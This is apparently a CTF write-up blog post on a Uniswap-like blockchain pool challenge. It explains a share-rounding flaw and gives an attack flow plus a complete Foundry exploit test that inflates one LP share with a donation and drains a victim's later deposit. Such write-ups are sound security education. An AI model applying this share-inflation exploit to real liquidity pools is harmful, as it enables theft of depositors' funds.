@@ -1,0 +1,380 @@
+---
+title: ITSEC CTF 2025 - Blockchains
+date: 2025/8/4
+description: How to be rich in web3?
+tags: [blockchain]
+---
+
+## Martabak Nikmat Cylabus (Chovid99) [upsolve]
+
+![description](/images/posts/itsec-ctf-2025-blockchains/desc.png)
+
+### Initial Analysis
+
+Given the source code of a martabak pool.
+
+![martabak](/images/posts/itsec-ctf-2025-blockchains/martabak.webp)
+
+After exploring around, this project is similar to uniswap (for token swapping). From `Setup.sol`, we as players can get 1000 token0 and 1000 token1 by calling `mint()`. We can also provide liquidity to the pool using tokens owned by the setup through `mintPool()` with the same amount of 1000 token0 and 1000 token1. The goal of this challenge is to figure out how we can have >= 1500 token0 and >= 999 token1.
+
+```solidity filename="Setup.sol" copy
+// SPDX-License-Identifier: GPL-2.0-or-later
+pragma solidity ^0.8.24;
+
+import {MartabakPoolManager} from "./MartabakPoolManager.sol";
+import {PoolKey} from "./types/PoolKey.sol";
+import {Currency} from "./types/Currency.sol";
+import {PoolId} from "./types/PoolId.sol";
+import {MockERC20} from ".//MockERC20.sol";
+import {IPoolManager} from "./interfaces/IPoolManager.sol";
+import {IMartabakPoolManager} from "./interfaces/IMartabakPoolManager.sol";
+import {LiquidityConfigurations} from "./libraries/math/LiquidityConfigurations.sol";
+import {PackedUint128Math} from "./libraries/math/PackedUint128Math.sol";
+import {BinHelper} from "./libraries/BinHelper.sol";
+import {MartabakPoolParametersHelper} from "./libraries/MartabakPoolParametersHelper.sol";
+
+contract Setup {
+    using MartabakPoolParametersHelper for bytes32;
+
+    MartabakPoolManager public immutable poolManager;
+    PoolKey public key;
+
+    Currency public currency0;
+    Currency public currency1;
+
+    uint24 public constant POOL_FEE = 3000; // 0.3% fee
+    uint24 public constant ACTIVE_ID = 2 ** 23;
+
+    bool public mintTokenForUserExecuted;
+    bool public mintPoolExecuted;
+
+    bytes32 poolParam;
+    address player;
+
+    MockERC20 public token0;
+    MockERC20 public token1;
+
+    constructor() {
+        poolManager = new MartabakPoolManager();
+        MockERC20 eggMartabak = new MockERC20("EggMartabak", "EGG", 18);
+        MockERC20 sweetMartabak = new MockERC20("SweetMartabak", "SWEET", 18);
+        (token0, token1) = address(eggMartabak) < address(sweetMartabak)
+            ? (eggMartabak, sweetMartabak)
+            : (sweetMartabak, eggMartabak);
+        currency0 = Currency.wrap(address(token0));
+        currency1 = Currency.wrap(address(token1));
+        key = PoolKey({
+            currency0: currency0,
+            currency1: currency1,
+            fee: POOL_FEE,
+            parameters: poolParam.setBinStep(10),
+            poolManager: IPoolManager(address(poolManager))
+        });
+        poolManager.initialize(key, ACTIVE_ID, 0);
+        token0.mint(address(this), 1000);
+        token1.mint(address(this), 1000);
+    }
+
+    function mintPool() external {
+        require(!mintPoolExecuted, "Mint can only be called once");
+        mintPoolExecuted = true;
+
+        token0.approve(address(poolManager), type(uint256).max);
+        token1.approve(address(poolManager), type(uint256).max);
+
+        bytes32[] memory liquidityConfigs = new bytes32[](1);
+        uint128 amount = 1000;
+        liquidityConfigs[0] = LiquidityConfigurations.encodeParams(
+            1e18,
+            1e18,
+            ACTIVE_ID
+        );
+        IMartabakPoolManager.MintParams memory mintParams = IMartabakPoolManager
+            .MintParams({
+                liquidityConfigs: liquidityConfigs,
+                amountIn: PackedUint128Math.encode(amount, amount),
+                salt: 0
+            });
+
+        poolManager.mint(key, mintParams);
+    }
+
+    function mint() external {
+        require(!mintTokenForUserExecuted, "Mint can only be called once");
+        mintTokenForUserExecuted = true;
+
+        player = msg.sender;
+
+        uint256 mintAmount = 1000;
+        token0.mint(msg.sender, mintAmount);
+        token1.mint(msg.sender, mintAmount);
+    }
+
+    function isSolved() external view returns (bool) {
+        return
+            token0.balanceOf(player) >= 1500 && token1.balanceOf(player) >= 999;
+    }
+}
+```
+
+This project uses the AMM (Automated Market Makers) principle, where we can swap tokens without waiting for someone who wants to exchange. Here, there are people who perform swaps, and there are also people who provide liquidity to the pool and they will get shares whose value corresponds to the tokens provided, for example if we deposit 10 tokens, we will get 1000 shares, so 1 share is worth 10/1000 or 0.01 tokens. Those shares can be burned to withdraw the tokens we deposited in the pool.
+
+So, my first guess was that we need to create inflation. Conceptually, inflation can occur if there are 2 tokens with very different supplies, for example token0 has 1000 and token1 has 2000, then if we want to swap token0 to token1, we will get more token1, and similarly if we swap token1 to token0, then we will get fewer token0. For this challenge case, we need to increase the value owned by 1 share, for example from the original 0.01 tokens we make it 1 token.
+
+All interactions will be handled by the `MartabakPoolManager.sol` contract which roughly contains these functions:
+
+-   `initialize`: setup liquidity pool
+-   `mint`: deposit tokens to pool + get shares
+-   `burn`: burn shares + withdraw tokens from pool according to the number of shares burned
+-   `donate`: deposit tokens to pool without getting shares back
+-   `getPosition`: see how many shares we have
+-   `getBin`: see how many token0 and token1 are in the liquidity pool
+
+What's interesting is the `donate` function because we don't get shares back. Besides that, based on the audit report made by the author from this link https://github.com/pancakeswap/infinity-core/blob/main/docs/audits/OtterSec.pdf (should’ve just googled the author’s name from the start 😩), there is a rounding down error when performing mint in calculating the number of shares obtained, which makes the generated shares not match the value they should have.
+
+```solidity filename="MartabakPool.sol" copy {29}
+function _updateBin(State storage self, MintParams memory params, uint24 id, bytes32 maxAmountsInToBin)
+    internal
+    returns (
+        uint256 shares,
+        bytes32 amountsIn,
+        bytes32 amountsInToBin,
+        bytes32 feeForProtocol,
+        bytes32 compositionFee
+    )
+{
+    Slot0 memory slot0Cache = self.slot0;
+    uint24 activeId = slot0Cache.activeId;
+    bytes32 binReserves = self.reserveOfBin[id];
+
+    uint256 price = id.getPriceFromId(params.binStep);
+    uint256 supply = self.shareOfBin[id];
+    (shares, amountsIn) = binReserves.getSharesAndEffectiveAmountsIn(maxAmountsInToBin, price, supply);
+    amountsInToBin = amountsIn;
+
+    if (id == activeId) {
+        bytes32 fees;
+        (fees, feeForProtocol) =
+            binReserves.getCompositionFees(slot0Cache.protocolFee, slot0Cache.lpFee, amountsIn, supply, shares);
+        compositionFee = fees;
+        if (fees != 0) {
+            {
+                uint256 userLiquidity = amountsIn.sub(fees).getLiquidity(price);
+                uint256 binLiquidity = binReserves.getLiquidity(price);
+                shares = userLiquidity.mulDivRoundDown(supply, binLiquidity);
+            }
+
+            if (feeForProtocol != 0) {
+                amountsInToBin = amountsInToBin.sub(feeForProtocol);
+            }
+        }
+    } else {
+        amountsIn.verifyAmounts(activeId, id);
+    }
+
+    if (shares == 0 || amountsInToBin == 0) revert MartabakPool__ZeroShares(id);
+    if (supply == 0) _addBinIdToTree(self, id);
+
+    self.reserveOfBin[id] = binReserves.add(amountsInToBin);
+}
+```
+
+### Solution
+
+Attack flow:
+
+1. `setup.mint`: get 1000 token0 and 1000 token1
+1. `poolManager.mint`: 0 token0 and 2 token1, get a lot of shares
+1. `poolManager.burn`: leaving 1 share
+1. `poolManager.donate`: 999 token1, but still only have 1 share
+1. `setup.mintPool`: victim deposits to the already inflated pool
+1. `poolManager.burn`: 1 share, get inflated tokens
+
+### Solver
+
+```solidity copy file="Exploit.t.sol"
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {Setup} from "../src/Setup.sol";
+import {MockERC20} from "../src/MockERC20.sol";
+import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
+import {IMartabakPoolManager} from "../src/interfaces/IMartabakPoolManager.sol";
+import {MartabakPoolManager} from "../src/MartabakPoolManager.sol";
+import {PoolKey} from "../src/types/PoolKey.sol";
+import {PoolId, PoolIdLibrary} from "../src/types/PoolId.sol";
+import {BinPosition} from "../src/libraries/BinPosition.sol";
+import {Currency} from "../src/types/Currency.sol";
+import {LiquidityConfigurations} from "../src/libraries/math/LiquidityConfigurations.sol";
+import {PackedUint128Math} from "../src/libraries/math/PackedUint128Math.sol";
+import "../src/libraries/MartabakPool.sol";
+
+contract Exploit is Test {
+    using PoolIdLibrary for PoolKey;
+
+    Setup setup;
+    MockERC20 token0;
+    MockERC20 token1;
+    PoolKey key;
+    MartabakPoolManager poolManager;
+    address player = address(this);
+    uint24 public constant ACTIVE_ID = 2 ** 23;
+    uint256 public constant INITIAL_MINT_AMOUNT = 1000;
+
+    function setUp() public {
+        setup = new Setup();
+        token0 = setup.token0();
+        token1 = setup.token1();
+
+        (
+            Currency currency0,
+            Currency currency1,
+            IPoolManager pm,
+            uint24 fee,
+            bytes32 parameters
+        ) = setup.key();
+
+        key = PoolKey({
+            currency0: currency0,
+            currency1: currency1,
+            fee: fee,
+            parameters: parameters,
+            poolManager: pm
+        });
+
+        poolManager = MartabakPoolManager(setup.poolManager());
+    }
+
+    function test_FirstMint() public {
+        setup.mint();
+        assertEq(token0.balanceOf(player), 1000);
+        assertEq(token1.balanceOf(player), 1000);
+    }
+
+    function test_Exploit() public {
+        setup.mint();
+
+        console.log("token0 balance:", token0.balanceOf(player));
+        console.log("token1 balance:", token1.balanceOf(player));
+
+        token0.approve(address(poolManager), type(uint256).max);
+        token1.approve(address(poolManager), type(uint256).max);
+
+        bytes32[] memory liquidityConfigs = new bytes32[](1);
+
+        liquidityConfigs[0] = LiquidityConfigurations.encodeParams(
+            1e18,
+            1e18,
+            ACTIVE_ID
+        );
+        IMartabakPoolManager.MintParams memory mintParams = IMartabakPoolManager
+            .MintParams({
+                liquidityConfigs: liquidityConfigs,
+                amountIn: PackedUint128Math.encode(0, 2),
+                salt: 0
+            });
+
+        poolManager.mint(key, mintParams);
+
+        console.log("after mint:");
+
+        uint24 activeId = setup.ACTIVE_ID();
+
+        BinPosition.Info memory myPos = poolManager.getPosition(
+            key.toId(),
+            player,
+            activeId,
+            bytes32(0)
+        );
+
+        console.log("shares:", myPos.share);
+
+        console.log("token0 balance:", token0.balanceOf(player));
+        console.log("token1 balance:", token1.balanceOf(player));
+
+        uint256[] memory ids = new uint256[](1);
+        ids[0] = activeId;
+        uint256[] memory amountsToBurn = new uint256[](1);
+        amountsToBurn[0] = myPos.share - 1;
+
+        // uint256 amountYOut = (amountsToBurn[0] * binReserveY) / binLiquidity;
+        // console.log("amountToBurn:", amountsToBurn[0]);
+        // console.log("amountYOut (calculated):", amountYOut);
+
+        IMartabakPoolManager.BurnParams memory params = IMartabakPoolManager
+            .BurnParams({
+                ids: ids,
+                amountsToBurn: amountsToBurn,
+                salt: bytes32(0)
+            });
+
+        poolManager.burn(key, params);
+
+        console.log("after burn:");
+
+        console.log("token0 balance:", token0.balanceOf(player));
+        console.log("token1 balance:", token1.balanceOf(player));
+
+        poolManager.donate(key, 0, 999);
+
+        console.log("after donate:");
+
+        BinPosition.Info memory myPos2 = poolManager.getPosition(
+            key.toId(),
+            player,
+            activeId,
+            bytes32(0)
+        );
+
+        console.log("shares:", myPos2.share); // 1
+
+        console.log("token0 balance:", token0.balanceOf(player));
+        console.log("token1 balance:", token1.balanceOf(player));
+
+        setup.mintPool();
+
+        (
+            uint128 binReserveX,
+            uint128 binReserveY,
+            uint256 binLiquidity
+        ) = poolManager.getBin(key.toId(), activeId);
+
+        console.log("after mintPool");
+
+        console.log("binReserveX:", binReserveX);
+        console.log("binReserveY", binReserveY);
+
+        uint256[] memory ids2 = new uint256[](1);
+        ids2[0] = activeId;
+        uint256[] memory amountsToBurn2 = new uint256[](1);
+        amountsToBurn2[0] = 1;
+
+        IMartabakPoolManager.BurnParams memory params2 = IMartabakPoolManager
+            .BurnParams({
+                ids: ids2,
+                amountsToBurn: amountsToBurn2,
+                salt: bytes32(0)
+            });
+
+        poolManager.burn(key, params2);
+
+        console.log("after burn (inflated)");
+
+        console.log("token0 balance:", token0.balanceOf(player));
+        console.log("token1 balance:", token1.balanceOf(player));
+
+        console.log(setup.isSolved());
+
+        assertEq(setup.isSolved(), true);
+    }
+}
+```
+
+In order to run this solver, we need to install foundry and run this command:
+
+```
+forge test -vvv
+```
+
+![test result](/images/posts/itsec-ctf-2025-blockchains/test.png)
